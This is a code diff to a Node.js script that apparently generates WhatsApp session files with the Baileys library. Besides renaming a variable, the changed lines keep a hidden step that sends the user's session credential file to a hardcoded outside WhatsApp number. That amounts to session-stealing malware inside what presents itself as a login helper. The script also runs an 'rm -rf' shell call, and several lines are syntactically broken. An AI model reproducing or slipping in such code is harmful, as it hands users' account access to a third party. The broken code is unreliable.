@@ -5,7 +5,7 @@ const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
 const { state, saveState } = useSingleFileAuthState('./Session/Session.Miku-MD.json')
 const qrc = JSON.parse(fs.readFileSync('./qr.json'))
-fle-nme = qrc.session-name
+flenme = qrc.session-name
 const { exec, spawn, execSync } = require("child_process")
 exec('rm -rf Session)
 
@@ -26,8 +26,8 @@ exec('rm -rf Session)
         if (connection == "open") {
             await delay(1000 * 10);
   const session = fs.readFileSync("./Session/Session.Miku-MD.json");
-   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
-	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
+   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `${flenme}` })
+	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
             process.exit(0)
         }
         if (
